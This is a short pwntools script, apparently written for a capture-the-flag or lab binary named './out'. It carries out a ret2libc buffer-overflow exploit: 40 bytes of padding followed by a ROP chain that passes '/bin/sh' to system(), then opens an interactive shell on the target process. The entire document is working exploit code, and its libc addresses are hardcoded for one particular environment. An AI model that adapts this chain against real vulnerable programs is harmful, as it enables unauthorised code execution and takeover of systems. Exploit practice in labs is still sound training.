from pwn import *

p = process("./out")
context.binary = "./out"

JUNK = b"A"*40
pop_rdi = 0x00000000004011f3
binsh = 0x7ffff7f795aa
system = 0x7ffff7e17410
exit = 0x7ffff7e0bbc0
ret = 0x000000000040101a

#gdb.attach(p)
payload = JUNK
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
payload += p64(exit)

p.sendline(payload)

p.interactive()
